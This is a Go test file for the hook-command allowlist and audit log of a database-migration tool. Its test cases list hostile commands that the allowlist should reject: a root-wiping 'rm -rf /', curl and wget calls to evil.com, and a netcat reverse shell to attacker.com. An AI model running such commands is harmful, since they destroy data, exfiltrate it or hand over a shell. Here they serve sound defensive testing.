package quiesce

import (
	"context"
	"testing"
	"time"

	v1alpha1 "github.com/aegis-migrate/portage/api/v1alpha1"
)

// MockHookExecutor implements HookExecutor for testing.
type MockHookExecutor struct{}

func (m *MockHookExecutor) ExecutePreQuiesce(ctx context.Context, migration *v1alpha1.PortageMigration) error {
	return nil
}

func (m *MockHookExecutor) ExecutePostQuiesce(ctx context.Context, migration *v1alpha1.PortageMigration) error {
	return nil
}

func TestHookAllowlist_PostgreSQL(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"psql -c 'CHECKPOINT'", true},
		{"PSQL -c 'SELECT 1'", true},
		{"pg_dump -Fc dbname", true},
		{"pg_restore -d dbname dumpfile", true},
		{"pg_basebackup -D /backup", true},
		{"checkpoint", true},
		{"backup_start", true},
		{"backup_stop", true},
		{"wal_backup", true},
		{"bash -c 'rm -rf /'", false},
		{"curl http://evil.com/exfil", false},
		{"wget http://evil.com/data", false},
		{"nc -e /bin/sh attacker.com 4444", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("postgresql", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(postgresql, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_MySQL(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"mysql -e 'FLUSH TABLES'", true},
		{"mysqldump --all-databases", true},
		{"mysqladmin flush-tables", true},
		{"mysql -e 'LOCK TABLES'", true},
		{"mysql -e 'UNLOCK TABLES'", true},
		{"bash", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("mysql", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(mysql, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_MongoDB(t *testing.T) {
	allowlist := DefaultHookAllowlist()

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"mongo --eval 'fsyncLock'", true},
		{"mongodump --archive=/backup/dump.gz", true},
		{"mongorestore --archive=/backup/dump.gz", true},
		{"fsync", true},
		{"lock", true},
		{"unlock", true},
		{"rm -rf /data", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("mongodb", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(mongodb, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_CustomDB(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	allowlist.Custom["customdb"] = []string{"custom-tool", "backup.sh"}

	tests := []struct {
		command    string
		allowlisted bool
	}{
		{"custom-tool --backup", true},
		{"BACKUP.SH /data", true},
		{"rm -rf /", false},
	}

	for _, tt := range tests {
		got := allowlist.IsAllowed("customdb", tt.command)
		if got != tt.allowlisted {
			t.Errorf("IsAllowed(customdb, %q) = %v, want %v", tt.command, got, tt.allowlisted)
		}
	}
}

func TestHookAllowlist_NoAllowlist(t *testing.T) {
	allowlist := &HookAllowlist{
		PostgreSQL: nil,
		Custom:     make(map[string][]string),
	}

	if !allowlist.IsAllowed("unknown_db", "any command") {
		t.Error("expected all commands to be allowed when no allowlist defined")
	}
}

func TestHookExecutorWithAllowlist_SkipNonAllowlisted(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	mockExec := &MockHookExecutor{}

	auditExec := NewHookExecutorWithAllowlist(mockExec, allowlist, "postgresql")

	migration := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceNamespace: "test-ns",
			PreQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "evil-hook", Type: v1alpha1.HookTypePodExec, PodExec: &v1alpha1.PodExecHook{
					Command: []string{"bash", "-c", "rm -rf /"},
				}},
			},
		},
	}

	err := auditExec.ExecutePreQuiesce(context.Background(), migration)
	if err == nil {
		t.Fatal("expected error for non-allowlisted command")
	}
	entries := auditExec.AuditLog().Entries()
	if len(entries) == 0 {
		t.Fatal("expected audit log entry")
	}
	entry := entries[0]
	if entry.Status != "denied" {
		t.Errorf("expected status 'denied', got %q", entry.Status)
	}
	if entry.Allowlisted {
		t.Error("expected allowlisted=false for non-allowlisted command")
	}
}

func TestHookExecutorWithAllowlist_AllowAllowlisted(t *testing.T) {
	allowlist := DefaultHookAllowlist()
	mockExec := &MockHookExecutor{}

	auditExec := NewHookExecutorWithAllowlist(mockExec, allowlist, "postgresql")

	migration := &v1alpha1.PortageMigration{
		Spec: v1alpha1.PortageMigrationSpec{
			SourceNamespace: "test-ns",
			PreQuiesceHooks: []v1alpha1.QuiescenceHook{
				{Name: "good-hook", Type: v1alpha1.HookTypePodExec, PodExec: &v1alpha1.PodExecHook{
					Command: []string{"psql", "-c", "CHECKPOINT;"},
				}},
			},
		},
	}

	err := auditExec.ExecutePreQuiesce(context.Background(), migration)
	if err != nil {
		t.Fatalf("expected success for allowlisted command, got: %v", err)
	}
	entries := auditExec.AuditLog().Entries()
	if len(entries) == 0 {
		t.Fatal("expected audit log entry")
	}
	entry := entries[0]
	if entry.Status != "success" {
		t.Errorf("expected status 'success', got %q", entry.Status)
	}
}

func TestAuditLog_RecordAndRetrieve(t *testing.T) {
	log := NewAuditLog()

	entry1 := AuditLogEntry{
		Name:        "test-hook",
		Namespace:   "test-ns",
		StartTime:   time.Now(),
		Allowlisted: true,
		Status:      "success",
	}
	log.Record(entry1)

	entries := log.Entries()
	if len(entries) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(entries))
	}
	if entries[0].Name != "test-hook" {
		t.Errorf("expected name 'test-hook', got %q", entries[0].Name)
	}

	latest := log.LastEntry()
	if latest == nil {
		t.Fatal("expected non-nil latest")
	}
	if latest.Name != "test-hook" {
		t.Errorf("expected latest name 'test-hook', got %q", latest.Name)
	}

	log.Record(AuditLogEntry{Name: "second-hook"})
	if len(log.Entries()) != 2 {
		t.Fatalf("expected 2 entries after second record, got %d", len(log.Entries()))
	}
}

func TestPGQuiescence_PreQuiesce(t *testing.T) {
	pg := NewPGQuiescence()
	if pg.MinBackupDuration != 2*time.Second {
		t.Errorf("expected MinBackupDuration 2s, got %v", pg.MinBackupDuration)
	}
	if pg.MaxBackupWait != 30*time.Second {
		t.Errorf("expected MaxBackupWait 30s, got %v", pg.MaxBackupWait)
	}
}

func TestQuiescenceHook_CommandString(t *testing.T) {
	tests := []struct {
		hook     v1alpha1.QuiescenceHook
		expected string
	}{
		{
			hook: v1alpha1.QuiescenceHook{
				PodExec: &v1alpha1.PodExecHook{
					Command: []string{"psql", "-c", "CHECKPOINT;"},
				},
			},
			expected: "psql",
		},
		{
			hook: v1alpha1.QuiescenceHook{
				HTTP: &v1alpha1.HTTPHook{
					Method: "POST",
					URL:    "http://localhost:8080/health",
				},
			},
			expected: "POST http://localhost:8080/health",
		},
		{
			hook:     v1alpha1.QuiescenceHook{},
			expected: "",
		},
	}

	for _, tt := range tests {
		got := tt.hook.CommandString()
		if got != tt.expected {
			t.Errorf("CommandString() = %q, want %q", got, tt.expected)
		}
	}
}

func TestAuditLog_Export(t *testing.T) {
	log := NewAuditLog()
	log.Record(AuditLogEntry{
		Name:        "test-hook",
		Type:        v1alpha1.HookTypePodExec,
		Namespace:   "test-ns",
		PodSelector: "app=postgres",
		Command:     "psql -c CHECKPOINT",
		Allowlisted: true,
		StartTime:   time.Now(),
		EndTime:     time.Now().Add(500 * time.Millisecond),
		Status:      "success",
	})

	exported := log.Export()
	if len(exported) != 1 {
		t.Fatalf("expected 1 exported entry, got %d", len(exported))
	}
	e := exported[0]
	if e["name"] != "test-hook" {
		t.Errorf("expected name 'test-hook', got %v", e["name"])
	}
	if e["allowlisted"] != true {
		t.Errorf("expected allowlisted=true, got %v", e["allowlisted"])
	}
	if e["status"] != "success" {
		t.Errorf("expected status='success', got %v", e["status"])
	}
}
